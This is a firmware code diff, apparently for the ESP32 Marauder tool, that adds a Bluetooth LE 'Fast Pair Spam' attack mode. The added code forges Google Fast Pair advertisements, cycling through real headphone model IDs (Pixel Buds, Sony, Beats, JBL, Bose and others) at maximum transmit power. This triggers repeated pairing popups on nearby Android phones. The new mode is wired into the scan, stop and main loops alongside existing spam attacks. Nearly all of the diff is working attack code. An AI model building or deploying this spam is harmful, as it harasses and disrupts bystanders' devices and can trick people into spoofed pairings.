@@ -37,6 +37,28 @@ extern "C" {
   NimBLEAdvertising *pAdvertising;
   NimBLEServer *pServer = NULL;
 
+  // Google Fast Pair Model IDs (genera popups en Android 6.0+)
+  const uint32_t WiFiScan::fastPairModels[] = {
+    0x0001F0,  // Google Pixel Buds
+    0x000047,  // Sony WF-1000XM4
+    0x000048,  // Sony WH-1000XM4
+    0x0000F0,  // Google Pixel Buds Pro
+    0x000055,  // Nothing Ear (1)
+    0x0000C2,  // JBL Tune 760NC
+    0x0000F7,  // JBL Tune 770NC
+    0x0000D8,  // JBL Live Pro 2
+    0x0002F7,  // Beats Studio Buds
+    0x000082,  // Samsung Galaxy Buds2
+    0x0000C1,  // Beats Fit Pro
+    0x0002D8,  // Beats Studio Pro
+    0x0000DA,  // Beats Flex
+    0x0000A0,  // Bose QC Ultra
+    0x0000B0,  // Sony LinkBuds
+    0x000006,  // Google Pixel Buds A
+    0x000007,  // Pixel Buds Pro 2
+  };
+  const int WiFiScan::fastPairModelsCount = sizeof(WiFiScan::fastPairModels) / sizeof(WiFiScan::fastPairModels[0]);
+
   //// https://github.com/Spooks4576
   NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
@@ -144,6 +166,40 @@ extern "C" {
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
         AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+        #ifndef HAS_DUAL_BAND
+          AdvData.addData(std::string((char *)AdvData_Raw, 14));
+        #else
+          AdvData.addData(AdvData_Raw, 14);
+        #endif
+        break;
+      }
+      case FastPair: {
+        // Seleccionar Model ID aleatorio del array
+        uint32_t modelId = fastPairModels[rand() % fastPairModelsCount];
+        Serial.printf("Fast Pair Model ID: 0x%06X\n", modelId);
+
+        AdvData_Raw = new uint8_t[14];
+
+        // Flags
+        AdvData_Raw[i++] = 0x02;  // Length
+        AdvData_Raw[i++] = 0x01;  // Type: Flags
+        AdvData_Raw[i++] = 0x06;  // Flags: LE General + BR/EDR Not Supported
+
+        // Service Data - Fast Pair Service UUID 0xFE2C
+        AdvData_Raw[i++] = 0x07;  // Length (1 type + 2 UUID + 3 Model ID + 1 extra)
+        AdvData_Raw[i++] = 0x16;  // Type: Service Data
+        AdvData_Raw[i++] = 0x2C;  // Fast Pair UUID Low
+        AdvData_Raw[i++] = 0xFE;  // Fast Pair UUID High
+        AdvData_Raw[i++] = (modelId >> 16) & 0xFF;  // Model ID byte 1
+        AdvData_Raw[i++] = (modelId >> 8) & 0xFF;   // Model ID byte 2
+        AdvData_Raw[i++] = modelId & 0xFF;          // Model ID byte 3
+        AdvData_Raw[i++] = 0x00;  // Extra byte
+
+        // TX Power
+        AdvData_Raw[i++] = 0x02;  // Length
+        AdvData_Raw[i++] = 0x0A;  // Type: TX Power
+        AdvData_Raw[i++] = (rand() % 120) - 100;  // -100 to +20 dBm
 
         #ifndef HAS_DUAL_BAND
           AdvData.addData(std::string((char *)AdvData_Raw, 14));
@@ -2069,7 +2125,8 @@ bool WiFiScan::scanning() {
 
 // Function to prepare to run a specific scan
 void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
-{  
+{
+  Serial.printf(">>> StartScan called with mode: %d <<<\n", scan_mode);
   this->initWiFi(scan_mode);
   if (scan_mode == WIFI_SCAN_OFF)
     StopScan(scan_mode);
@@ -2166,6 +2223,15 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
   else if (scan_mode == BT_ATTACK_SOUR_APPLE) {
     #ifdef HAS_BT
       RunSourApple(scan_mode, color);
+    #endif
+  }
+  else if (scan_mode == BT_ATTACK_FAST_PAIR_SPAM) {
+    Serial.printf(">>> StartScan: Matched BT_ATTACK_FAST_PAIR_SPAM (value=%d) <<<\n", BT_ATTACK_FAST_PAIR_SPAM);
+    #ifdef HAS_BT
+      Serial.println(">>> StartScan: Calling RunFastPairSpam <<<");
+      RunFastPairSpam(scan_mode, color);
+    #else
+      Serial.println(">>> StartScan: HAS_BT not defined! <<<");
     #endif
   }
   else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
@@ -2496,6 +2562,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
   (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
   (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
+  (currentScanMode == BT_ATTACK_FAST_PAIR_SPAM) ||
   (currentScanMode == BT_SPOOF_AIRTAG) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
@@ -4342,6 +4409,35 @@ void WiFiScan::executeSourApple() {
   #endif
 }
 
+void WiFiScan::executeFastPairSpam() {
+  #ifdef HAS_BT
+    // Verificar que pAdvertising existe
+    if (pAdvertising == NULL) {
+      Serial.println("ERROR: pAdvertising is NULL!");
+      return;
+    }
+
+    // Verificar que pServer existe
+    if (pServer == NULL) {
+      Serial.println("ERROR: pServer is NULL!");
+      return;
+    }
+
+    delay(40);
+
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(FastPair);
+
+    // Configurar máxima potencia TX para mejor alcance
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(100);  // 100ms para que Android detecte el advertisement
+    pAdvertising->stop();
+    delay(50);   // Pausa entre advertisements
+  #endif
+}
+
 void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
   // Use ESP-IDF function to set the base MAC address
   #ifndef HAS_DUAL_BAND
@@ -4963,6 +5059,62 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
     #else
       led_obj.setMode(MODE_ATTACK);
     #endif
+  #endif
+}
+
+void WiFiScan::RunFastPairSpam(uint8_t scan_mode, uint16_t color) {
+  #ifdef HAS_BT
+    Serial.println(">>> RunFastPairSpam CALLED <<<");
+
+    // SIEMPRE inicializar BLE si pAdvertising es NULL
+    if (pAdvertising == NULL) {
+      Serial.println("Fast Pair: Initializing BLE (pAdvertising was NULL)...");
+      if (!NimBLEDevice::getInitialized()) {
+        NimBLEDevice::init("");
+      }
+      pServer = NimBLEDevice::createServer();
+      pAdvertising = pServer->getAdvertising();
+      Serial.printf("Fast Pair: pServer=%p, pAdvertising=%p\n", pServer, pAdvertising);
+    }
+
+    if (pAdvertising == NULL) {
+      Serial.println("FATAL: Could not initialize pAdvertising!");
+      return;
+    }
+
+    this->ble_initialized = true;
+    Serial.println("Fast Pair: BLE initialized successfully");
+
+    #ifdef HAS_SCREEN
+      display_obj.TOP_FIXED_AREA_2 = 48;
+      display_obj.tteBar = true;
+      display_obj.print_delay_1 = 15;
+      display_obj.print_delay_2 = 10;
+      display_obj.initScrollValues(true);
+      display_obj.tft.setTextWrap(false);
+      display_obj.tft.setTextColor(TFT_BLACK, TFT_MAGENTA);
+      #ifdef HAS_FULL_SCREEN
+        display_obj.tft.fillRect(0,16,TFT_WIDTH,16, TFT_MAGENTA);
+        display_obj.tft.drawCentreString("Fast Pair Spam",TFT_WIDTH / 2,16,2);
+      #endif
+      #ifdef HAS_ILI9341
+        display_obj.touchToExit();
+      #endif
+      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    #endif
+
+    #ifdef HAS_FLIPPER_LED
+      flipper_led.attackLED();
+    #elif defined(XIAO_ESP32_S3)
+      xiao_led.attackLED();
+    #elif defined(MARAUDER_M5STICKC)
+      stickc_led.attackLED();
+    #else
+      led_obj.setMode(MODE_ATTACK);
+    #endif
+
+    Serial.println("Fast Pair: Ready to spam!");
+
   #endif
 }
 
@@ -10292,6 +10444,7 @@ void WiFiScan::main(uint32_t currentTime)
            (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
            (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
            (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
+           (currentScanMode == BT_ATTACK_FAST_PAIR_SPAM) ||
            (currentScanMode == BT_SPOOF_AIRTAG)) {
     #ifdef HAS_BT
       if (currentTime - initTime >= 1000) {
@@ -10328,7 +10481,10 @@ void WiFiScan::main(uint32_t currentTime)
       if ((currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
         this->executeSwiftpairSpam(FlipperZero);
-      
+
+      if (currentScanMode == BT_ATTACK_FAST_PAIR_SPAM)
+        this->executeFastPairSpam();
+
       if (currentScanMode == BT_SPOOF_AIRTAG)
         this->executeSpoofAirtag();
 
